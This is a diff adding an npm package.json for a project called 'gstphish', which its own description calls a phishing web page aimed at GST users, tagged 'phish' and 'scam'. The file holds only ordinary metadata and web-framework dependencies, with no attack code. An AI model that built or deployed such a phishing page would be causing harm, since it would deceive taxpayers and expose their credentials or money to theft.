@@ -1,0 +1,31 @@
+{
+  "name": "gstphish",
+  "version": "1.0.0",
+  "description": "Phishing Web Page targeted at GST users",
+  "main": "index.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1"
+  },
+  "repository": {
+    "type": "git",
+    "url": "git+https://github.com/sahilbabbar/gstphish.git"
+  },
+  "keywords": [
+    "phish",
+    "gst",
+    "scam"
+  ],
+  "author": "Sahil Babbar",
+  "license": "ISC",
+  "bugs": {
+    "url": "https://github.com/sahilbabbar/gstphish/issues"
+  },
+  "homepage": "https://github.com/sahilbabbar/gstphish#readme",
+  "dependencies": {
+    "@uirouter/angularjs": "^1.0.8",
+    "angular": "^1.6.6",
+    "bootstrap": "^3.3.7",
+    "express": "^4.16.2",
+    "jquery": "^3.2.1"
+  }
+}
